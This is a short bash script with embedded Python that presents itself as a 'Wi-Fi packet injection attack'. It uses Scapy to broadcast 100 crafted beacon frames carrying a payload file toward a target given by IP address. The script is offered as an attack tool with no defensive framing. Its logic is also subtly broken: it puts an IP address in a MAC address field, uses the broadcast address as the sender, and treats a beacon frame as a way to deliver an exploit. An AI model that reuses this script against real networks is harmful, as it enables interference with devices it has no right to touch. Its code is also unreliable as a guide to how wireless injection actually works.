#!/bin/bash
# Wi-Fi Packet Injection Attack
# Usage: wifi_packet_inject.sh <target_ip> <payload_file>

TARGET_IP=$1
PAYLOAD_FILE=$2

if [ -z "$TARGET_IP" ] || [ -z "$PAYLOAD_FILE" ]; then
    echo "Usage: $0 <target_ip> <payload_file>"
    exit 1
fi

echo "Starting Wi-Fi packet injection attack on: $TARGET_IP"

# Use Scapy to send crafted packets
python3 - <<EOF
from scapy.all import *

target_ip = "$TARGET_IP"
payload = open("$PAYLOAD_FILE", "rb").read()

packet = RadioTap() / Dot11(addr1=target_ip, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff") / Dot11Beacon(cap="ESS+privacy") / Dot11Elt(ID="SSID", info="Exploit") / Raw(payload)
sendp(packet, iface="wlan0", count=100)

print("Wi-Fi packet injection completed.")
EOF
